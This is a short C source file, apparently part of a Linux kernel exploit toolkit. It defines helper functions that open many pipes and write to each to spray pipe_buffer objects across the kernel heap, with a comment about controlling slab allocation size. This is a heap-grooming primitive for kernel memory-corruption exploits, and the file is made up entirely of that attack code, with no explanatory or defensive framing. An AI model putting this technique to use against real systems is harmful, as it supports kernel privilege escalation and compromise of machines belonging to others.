#include "pipe_buffer.h"

int pipe_buffer_alloc(int pipe_fds[2]) {
    if (pipe(pipe_fds) == -1) return -1;
    // F_SETPIPE_SZ to control slab allocation size if needed
    // Typically 16 pages by default
    return 0;
}

int pipe_buffer_spray(int num_pipes, int pipe_fds[][2]) {
    for (int i = 0; i < num_pipes; i++) {
        if (pipe_buffer_alloc(pipe_fds[i]) == -1) return -1;
        // Fill pipe to allocate pipe_buffer objects
        write(pipe_fds[i][1], "angband", 7);
    }
    return 0;
}
